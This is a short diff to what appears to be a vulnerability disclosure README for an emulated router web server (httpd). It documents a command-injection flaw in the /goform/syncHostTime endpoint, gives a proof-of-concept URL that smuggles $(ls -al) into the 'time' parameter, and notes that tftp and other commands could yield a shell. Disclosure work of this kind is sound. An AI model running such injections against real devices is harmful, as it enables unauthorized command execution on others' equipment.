@@ -30,15 +30,17 @@ sudo qemu-system-mipsel -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_
 
 # Vulnerability information
 ![image](https://github.com/user-attachments/assets/33559806-3b51-4215-96f5-0ccb4eee08cd)
+
 Pass the URL parameters to var, control var, and then execute the corresponding system function through doSystemCmd.
 
 ## after emulate successed
 run ./bin/httpd 
+
 ![image](https://github.com/user-attachments/assets/7a584e9a-0ac2-4bf9-9d61-6ed739434c99)
 
 ## browser access
 http://192.168.1.140/goform/syncHostTime/js/libs/reasy-ui-1.0.3.js?time=$(ls%20-al)
-you can see it in the simulation termina
+you can see it in the simulation terminal
 ![image](https://github.com/user-attachments/assets/725fa838-9d72-4f69-a5a9-9c2b105b3754)
 
 After testing, not only can execute 'ls'. Can also execute 'echo', 'cat', 'tftp' and other commands that can be used to construct payloads to obtain shell commands
